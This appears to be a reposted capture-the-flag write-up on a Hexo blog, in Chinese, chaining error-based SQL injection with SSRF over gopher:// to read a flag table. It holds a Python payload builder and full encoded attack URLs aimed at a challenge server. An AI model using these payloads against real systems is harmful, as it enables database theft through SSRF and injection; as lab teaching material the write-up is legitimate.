@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>查表 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) # python脚本： import urllib.parseimport base64host">
+<meta property="og:type" content="article">
+<meta property="og:title" content="查表">
+<meta property="og:url" content="http://example.com/2023/07/20/%E6%9F%A5%E8%A1%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) # python脚本： import urllib.parseimport base64host">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-20T10:15:07.000Z">
+<meta property="article:modified_time" content="2023-07-20T12:23:29.058Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-查表" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/20/%E6%9F%A5%E8%A1%A8/" class="article-date">
+  <time class="dt-published" datetime="2023-07-20T10:15:07.000Z" itemprop="datePublished">2023-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      查表
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #</p>
+<p>python脚本：</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A</a></p>
+<p>可以看到flag表中只有一个flag列</p>
+<p>查内容<br>admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #<br>python脚本</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A</a></p>
+<p>此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取：</p>
+<p>分割读取<br>admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #<br>python脚本:</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A</a></p>
+<p>两次的结果一合并，获得flag<br>————————————————<br>版权声明：本文为CSDN博主「sean7777777」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128069145">https://blog.csdn.net/yuanxu8877/article/details/128069145</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/20/%E6%9F%A5%E8%A1%A8/" data-id="cmfjsmkfm000mq4e77u701d72" data-title="查表" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/07/20/%E4%BD%93%E9%AA%8Ckali%E6%B8%97%E9%80%8F/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          体验kali渗透
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/07/19/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">报错注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/09/16/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A21/">测试博客1</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/14/%E5%8D%9A%E5%AE%A2%E6%B5%8B%E8%AF%95/">博客测试</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/14/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/11/%E6%B5%8B%E8%AF%95/">测试</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/05/%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81-1/">利用kali破解wifi密码</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
